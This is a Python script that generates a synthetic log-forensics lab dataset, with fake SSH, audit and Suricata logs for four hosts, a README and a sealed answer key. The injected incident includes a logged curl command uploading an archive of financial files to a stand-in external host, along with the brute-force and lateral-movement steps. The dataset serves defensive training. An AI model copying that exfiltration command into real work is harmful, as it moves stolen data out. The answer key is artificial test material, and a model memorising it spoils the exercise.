import os
import json
import hashlib
import zipfile
from datetime import datetime, timedelta
import random

# Configuration
ZIP_FILENAME = "bloodhound_dataset_01.zip"
BASE_DIR = "bloodhound_dataset_01"
NODES = {"node1": "10.50.0.11", "node2": "10.50.0.12", "node3": "10.50.0.13", "node4": "10.50.0.14"}
EXT_ATTACKER = "198.51.100.45"
EXT_EXFIL = "203.0.113.99"
START_TIME = datetime(2026, 7, 26, 18, 0, 0)

# In-memory file storage
files_content = {}

def add_file(path, content):
    files_content[f"{BASE_DIR}/{path}"] = content

def fmt_time(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S+00:00")

def generate_background_auth(node, ip, num_events):
    logs = []
    current_time = START_TIME
    for _ in range(num_events):
        current_time += timedelta(minutes=random.randint(2, 10))
        logs.append(f"{fmt_time(current_time)} {node} sshd[{random.randint(1000,9999)}]: Accepted publickey for admin from 10.50.0.100 port {random.randint(30000,60000)} ssh2")
        logs.append(f"{fmt_time(current_time + timedelta(seconds=2))} {node} systemd-logind[402]: New session {random.randint(10,90)} of user admin.")
        logs.append(f"{fmt_time(current_time + timedelta(minutes=5))} {node} sshd[{random.randint(1000,9999)}]: disconnected by user admin")
    return logs, current_time

def generate_background_syslog(node, num_events):
    logs = []
    current_time = START_TIME
    for _ in range(num_events):
        current_time += timedelta(minutes=random.randint(1, 8))
        logs.append(f"{fmt_time(current_time)} {node} CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/local/bin/metrics_gather.sh)")
        logs.append(f"{fmt_time(current_time + timedelta(seconds=1))} {node} systemd[1]: Starting System Activity Data Collector...")
    return logs

# Generate background noise
node_auth_logs = {n: [] for n in NODES}
node_syslogs = {n: [] for n in NODES}
eve_logs = []

for node, ip in NODES.items():
    auth, _ = generate_background_auth(node, ip, 15)
    node_auth_logs[node].extend(auth)
    node_syslogs[node].extend(generate_background_syslog(node, 25))

# --- INCIDENT INJECTION ---

# 1. Initial Access on Node 1 (Brute force & Success)
t = START_TIME + timedelta(minutes=14)
for i in range(5):
    t += timedelta(seconds=3)
    node_auth_logs["node1"].append(f"{fmt_time(t)} node1 sshd[8421]: Failed password for svc_web from {EXT_ATTACKER} port 49218 ssh2")
    eve_logs.append(json.dumps({"timestamp": fmt_time(t), "flow_id": 849201+i, "event_type": "ssh", "src_ip": EXT_ATTACKER, "src_port": 49218+i, "dest_ip": NODES["node1"], "dest_port": 22, "ssh": {"client": "SSH-2.0-OpenSSH_8.9", "server": "SSH-2.0-OpenSSH_8.9", "status": "failed"}}))

t += timedelta(seconds=12)
node_auth_logs["node1"].append(f"{fmt_time(t)} node1 sshd[8429]: Accepted password for svc_web from {EXT_ATTACKER} port 49225 ssh2")
node_syslogs["node1"].append(f"{fmt_time(t)} node1 audit[8429]: USER_LOGIN pid=8429 uid=1001 auid=1001 ses=45 msg='op=login acct=\"svc_web\" exe=\"/usr/sbin/sshd\" hostname={EXT_ATTACKER} addr={EXT_ATTACKER} terminal=ssh res=success'")

# 2. Discovery on Node 1 (Finding config file pointing to node2)
t += timedelta(minutes=4)
node_syslogs["node1"].append(f"{fmt_time(t)} node1 audit[8500]: EXECVE pid=8500 uid=1001 auid=1001 ses=45 msg='argc=3 a0=\"cat\" a1=\"/etc/webapp/db_backend_link.conf\"'")
node_syslogs["node1"].append(f"{fmt_time(t+timedelta(seconds=2))} node1 audit[8501]: EXECVE pid=8501 uid=1001 auid=1001 ses=45 msg='argc=3 a0=\"ssh\" a1=\"data_sync@10.50.0.12\"'")

# 3. Lateral Movement to Node 2
t += timedelta(seconds=5)
node_auth_logs["node2"].append(f"{fmt_time(t)} node2 sshd[9102]: Accepted publickey for data_sync from {NODES['node1']} port 38192 ssh2")
node_syslogs["node2"].append(f"{fmt_time(t)} node2 audit[9102]: USER_LOGIN pid=9102 uid=1002 auid=1002 ses=12 msg='op=login acct=\"data_sync\" exe=\"/usr/sbin/sshd\" hostname={NODES['node1']} addr={NODES['node1']} terminal=ssh res=success'")

# 4. Preparation on Node 2
t += timedelta(minutes=7)
node_syslogs["node2"].append(f"{fmt_time(t)} node2 audit[9150]: EXECVE pid=9150 uid=1002 auid=1002 ses=12 msg='argc=4 a0=\"tar\" a1=\"-czf\" a2=\"/tmp/sync_cache.tar.gz\" a3=\"/var/lib/financial_vault/\"'")

# 5. Exfiltration from Node 2 to External Destination
t += timedelta(minutes=6)
node_syslogs["node2"].append(f"{fmt_time(t)} node2 audit[9175]: EXECVE pid=9175 uid=1002 auid=1002 ses=12 msg='argc=4 a0=\"curl\" a1=\"-X\" a2=\"POST\" a3=\"--data-binary\" a4=\"@/tmp/sync_cache.tar.gz\" a5=\"https://{EXT_EXFIL}/upload\"'")
eve_logs.append(json.dumps({"timestamp": fmt_time(t), "flow_id": 993821, "event_type": "flow", "src_ip": NODES["node2"], "src_port": 51922, "dest_ip": EXT_EXFIL, "dest_port": 443, "proto": "TCP", "app_proto": "tls", "flow": {"pkts_toserver": 4500, "pkts_toclient": 120, "bytes_toserver": 8504300, "bytes_toclient": 5400}}))

# --- BENIGN DISTRACTION ---
# Authorized scan against node 3 causing noisy Suricata alerts
t_distract = START_TIME + timedelta(minutes=45)
eve_logs.append(json.dumps({"timestamp": fmt_time(t_distract), "flow_id": 112233, "event_type": "alert", "src_ip": "10.50.0.250", "src_port": 40111, "dest_ip": NODES["node3"], "dest_port": 80, "alert": {"signature": "ET SCAN Suspicious inbound connection", "severity": 3}}))
node_syslogs["node3"].append(f"{fmt_time(t_distract)} node3 systemd[1]: Reloading Nginx Web Server...")

# Sort all logs chronologically
for node in NODES:
    node_auth_logs[node].sort()
    node_syslogs[node].sort()
    add_file(f"logs/{node}/auth.log", "\n".join(node_auth_logs[node]) + "\n")
    add_file(f"logs/{node}/syslog", "\n".join(node_syslogs[node]) + "\n")

eve_logs.sort(key=lambda x: json.loads(x)["timestamp"])
add_file("logs/sensor/eve.json", "\n".join(eve_logs) + "\n")

# README
readme = """# Project Bloodhound — Python Log Detective Lab
Dataset: bloodhound_dataset_01
Investigation Window: 2026-07-26 18:00:00 to 22:00:00 UTC
Timezone: UTC

## Structure
- `logs/` Contains RFC 3339 formatted Linux `auth.log` and `syslog` for 4 endpoint nodes.
- `logs/sensor/eve.json` Contains JSON Lines/NDJSON network monitoring logs.
- `sealed/ground_truth.md` Answer key (Do not open until analysis is complete).
"""
add_file("README.md", readme)

# Ground Truth
ground_truth = f"""# Ground Truth Answer Key

## Incident Summary
An external adversary (`{EXT_ATTACKER}`) successfully brute-forced the `svc_web` account on `node1`. Reconnaissance on `node1` led to the discovery of `/etc/webapp/db_backend_link.conf`, which revealed `node2`'s role. The adversary pivoted to `node2` via SSH using the `data_sync` account, archived sensitive files from `/var/lib/financial_vault/`, and exfiltrated the archive to an external server (`{EXT_EXFIL}`).

## Incident Sequence
1. **Initial Access**: {EXT_ATTACKER} brute-forced `node1` via SSH (Direct Evidence: `auth.log` failed/accepted passwords).
2. **Discovery**: Intruder ran `cat /etc/webapp/db_backend_link.conf` on `node1` (Direct Evidence: `syslog` audit EXECVE). This provided the motivation to target `node2`.
3. **Lateral Movement**: SSH session established from `node1` to `node2` as `data_sync` (Direct Evidence: `auth.log` on `node2`).
4. **Preparation**: Intruder executed `tar -czf /tmp/sync_cache.tar.gz /var/lib/financial_vault/` on `node2` (Direct Evidence: `syslog` audit).
5. **Exfiltration**: Intruder used `curl` to upload the archive to `https://{EXT_EXFIL}/upload`. Corroborated by `eve.json` showing an 8.5MB outbound flow to `{EXT_EXFIL}` over port 443.

## Benign Distractions
- **Vulnerability Scan**: `10.50.0.250` triggered a Suricata alert against `node3`. This is a distraction; the IP is an internal scanner (inferred from subnet) and no successful access or lateral movement followed.

## Uncertainties
- The logs do not prove the exact contents of the exfiltrated vault, only that the directory was archived and a data transfer of corresponding size occurred. 
"""
add_file("sealed/ground_truth.md", ground_truth)

# Generate Manifest
manifest_lines = []
for filepath, content in files_content.items():
    if not filepath.endswith("manifest.sha256"):
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        rel_path = filepath.replace(f"{BASE_DIR}/", "")
        manifest_lines.append(f"{file_hash}  {rel_path}")

add_file("manifest.sha256", "\n".join(manifest_lines) + "\n")

# Create ZIP
with zipfile.ZipFile(ZIP_FILENAME, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for filepath, content in files_content.items():
        zipf.writestr(filepath, content)

print(f"[{ZIP_FILENAME}] Successfully generated and validated.")
